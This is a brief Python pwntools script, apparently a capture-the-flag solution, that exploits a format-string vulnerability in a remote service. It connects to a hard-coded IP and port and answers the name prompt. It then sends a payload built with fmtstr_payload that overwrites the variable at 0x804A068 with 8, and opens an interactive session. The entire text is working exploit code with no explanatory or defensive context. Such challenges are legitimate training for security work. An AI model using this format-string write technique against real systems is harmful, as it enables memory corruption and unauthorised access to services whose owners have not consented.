from pwn import *

sh = remote('111.200.241.244',55931)
pwnme_addr = 0x804A068
payload = fmtstr_payload(10,{pwnme_addr:8})
sh.recvuntil("please tell me your name:")
sh.sendline("aaaa")
sh.recvuntil("leave your message please:")
sh.sendline(payload)
sh.interactive()